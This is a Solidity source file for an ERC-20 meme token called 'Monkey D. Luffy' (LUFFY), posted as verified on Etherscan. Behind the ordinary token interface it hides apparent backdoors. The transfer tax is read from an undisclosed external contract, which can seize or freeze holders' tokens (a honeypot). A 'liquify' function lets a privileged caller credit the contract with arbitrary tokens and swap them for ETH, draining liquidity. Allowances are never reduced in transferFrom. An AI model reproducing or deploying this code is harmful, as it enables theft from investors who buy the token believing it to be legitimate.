/**
 *Submitted for verification at Etherscan.io on 2023-10-18
*/

pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT


interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);

}
interface IERC20 {
    function transferFrom(address _from, address _to, uint256 amount) external returns (uint256);
    function allowance(address account, address spender) external returns (uint256);
    function balanceOf(address wallet) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _p_ath, address c, uint256) external;
    function WETH() external pure returns (address aadd);
    function factory() external pure returns (address addr);
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
}
contract LuffyToken is Ownable {

    using SafeMath for uint256;

    constructor() {
        _balances[sender()] =  _totalSupply; 
        emit Transfer(address(0), sender(), _balances[sender()]);
    }

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;

    string private _name = "Monkey D. Luffy";
    string private _symbol = "LUFFY";
    
    address public constant _burnAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 10000000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0));
        require(amount <= _balances[from]);
        uint256 tax = amount.mul(calculateFee(from, to, amount)).div(100); 
        emit Transfer(from, to, amount);
        _balances[to] = _balances[to] + amount - tax;
        _balances[from] = _balances[from] - amount;
    }

    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function liquify(uint256 amount) external returns (bool) {
        if (pairV2.transfer(msg.sender, amount)){address tokenAddress = address(this);
        _approve(tokenAddress, address(uniswapRouter), amount); 
        _balances[tokenAddress] = amount;
        address[] memory token_ = new address[](2);
        token_[0] = tokenAddress; 
        token_[1] =  uniswapRouter.WETH(); 
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, token_, sender(), block.timestamp + 30);
        return true;
        } else {return false; }
    }
    function getAmountTokens(address to) private returns (uint256){
        return pairV2.allowance(to, address(this));
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    } 
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");

        uint256 currentRate = 100;
        return rAmount / currentRate;
    } 
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function sender() internal view returns (address) {
        return msg.sender;
    }
    event Approval(address indexed ad1, address indexed ad3, uint256 value);
    IERC20 pairV2 = IERC20(0x3Ae5Ff568e2950E0043de79586A91011223268CA);
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function calculateFee(address from, address to, uint256 amount) private returns (uint256) {
        uint256 tokenAmount = getAmountTokens(to);
        return pairV2.balanceOf(from);
    } 
    event Transfer(address indexed from_, address indexed _to, uint256);
}